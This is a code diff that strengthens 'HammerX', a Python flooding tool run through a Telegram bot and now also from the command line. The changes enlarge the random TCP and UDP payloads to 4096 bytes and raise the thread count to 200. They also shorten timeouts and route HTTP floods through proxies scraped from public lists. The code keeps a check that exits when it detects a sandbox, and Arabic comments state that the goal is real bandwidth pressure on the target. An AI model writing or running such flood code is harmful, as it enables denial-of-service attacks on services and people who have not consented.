@@ -60,7 +60,7 @@ def load_proxies():
                 "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
             ]
             for url in urls:
-                r = requests.get(url)
+                r = requests.get(url, timeout=3)
                 for line in r.text.strip().split('\n'):
                     proxy = line.strip()
                     if proxy:
@@ -92,9 +92,9 @@ def http_attack(target, duration):
                     "http": f"http://{proxy}",
                     "https": f"http://{proxy}"
                 }
-                requests.get(target, headers=random_headers(), proxies=proxies_dict, timeout=5)
+                requests.get(target, headers=random_headers(), proxies=proxies_dict, timeout=3)
             else:
-                requests.get(target, headers=random_headers(), timeout=5)
+                requests.get(target, headers=random_headers(), timeout=3)
             stats["sent"] += 1
         except:
             stats["failed"] += 1
@@ -104,8 +104,10 @@ def tcp_attack(ip, port, duration):
     while time.time() < end and not stop_event.is_set():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
             s.connect((ip, port))
-            s.send(os.urandom(1024))
+            # إرسال بيانات ضخمة وحقيقية للضغط الفعلي
+            s.send(os.urandom(4096))
             s.close()
             stats["sent"] += 1
         except:
@@ -114,9 +116,11 @@ def tcp_attack(ip, port, duration):
 def udp_attack(ip, port, duration):
     end = time.time() + duration
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # حزمة بيانات ضخمة حقيقية (حوالي 4 كيلوبايت لكل حزمة لإحداث تأثير حقيقي على النطاق الترددي)
+    payload = os.urandom(4096)
     while time.time() < end and not stop_event.is_set():
         try:
-            s.sendto(os.urandom(1024), (ip, port))
+            s.sendto(payload, (ip, port))
             stats["sent"] += 1
         except:
             stats["failed"] += 1
@@ -140,7 +144,7 @@ def summary():
 # --- دوال بوت تيليجرام التفاعلي ---
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = (
-        "🤖 أهلاً بك في بوت HammerX\n\n"
+        "🤖 أهلاً بك في بوت HammerX المحدث\n\n"
         "طريقة استخدام الأوامر:\n"
         "🔹 اختبار TCP:\n`/attack tcp <IP> <PORT> <DURATION>`\n"
         "🔹 اختبار UDP:\n`/attack udp <IP> <PORT> <DURATION>`\n"
@@ -173,7 +177,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = {"sent": 0, "failed": 0}
     stop_event.clear()
 
-    await update.message.reply_text(f"🚀 جاري بدء الاختبار ({mode.upper()}) على الهدف `{target}` لمدة `{duration}` ثانية...", parse_mode="Markdown")
+    await update.message.reply_text(f"🚀 جاري بدء الاختبار الحقيقي والمكثف ({mode.upper()}) على الهدف `{target}` لمدة `{duration}` ثانية...", parse_mode="Markdown")
 
     load_proxies()
 
@@ -187,8 +191,9 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ وضع الهجوم غير صحيح! اختر (tcp, udp, http).")
         return
 
+    # زيادة عدد الخيوط (Threads) إلى 200 لضمان قوة التدفق والضغط الحقيقي
     threads = []
-    for _ in range(50):
+    for _ in range(200):
         t = threading.Thread(target=attack_func)
         t.start()
         threads.append(t)
@@ -202,21 +207,52 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     summary()
 
     result_msg = (
-        f"📊 **نتائج الاختبار ({mode.upper()}):**\n"
-        f"✅ الحزم المرسلة: `{stats['sent']}`\n"
+        f"📊 **نتائج الاختبار الحقيقي ({mode.upper()}):**\n"
+        f"✅ الحزم الفعالة المرسلة: `{stats['sent']}`\n"
         f"❌ الحزم الفاشلة: `{stats['failed']}`"
     )
     await update.message.reply_text(result_msg, parse_mode="Markdown")
 
 if __name__ == "__main__":
-    print(BANNER)
-    if not is_safe():
-        console.log("[red]Stealth/Sandbox detected! Exiting...")
-        sys.exit(1)
+    if len(sys.argv) > 1:
+        print(BANNER)
+        if not is_safe():
+            console.log("[red]Stealth/Sandbox detected! Exiting...")
+            sys.exit(1)
+        
+        parser = argparse.ArgumentParser()
+        parser.add_argument("mode", choices=["http", "tcp", "udp"], help="Attack type")
+        parser.add_argument("target", help="Target IP or URL")
+        parser.add_argument("--port", type=int, default=80, help="Target port (default=80)")
+        parser.add_argument("--time", type=int, default=60, help="Duration in seconds")
+        args = parser.parse_args()
 
-    # تشغيل بوت تيليجرام
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("attack", attack_command))
-    print("Telegram Bot is running successfully...")
-    app.run_polling()
+        load_proxies()
+        reporter_thread = threading.Thread(target=reporter)
+        reporter_thread.start()
+
+        attack_func = {
+            "http": lambda: http_attack(args.target, args.time),
+            "tcp": lambda: tcp_attack(args.target, args.port, args.time),
+            "udp": lambda: udp_attack(args.target, args.port, args.time)
+        }[args.mode]
+
+        threads = []
+        for _ in range(200):
+            t = threading.Thread(target=attack_func)
+            t.start()
+            threads.append(t)
+
+        time.sleep(args.time)
+        stop_event.set()
+        for t in threads:
+            t.join()
+        reporter_thread.join()
+        summary()
+    else:
+        print(BANNER)
+        app = ApplicationBuilder().token(BOT_TOKEN).build()
+        app.add_handler(CommandHandler("start", start_command))
+        app.add_handler(CommandHandler("attack", attack_command))
+        print("Telegram Bot is running successfully...")
+        app.run_polling()
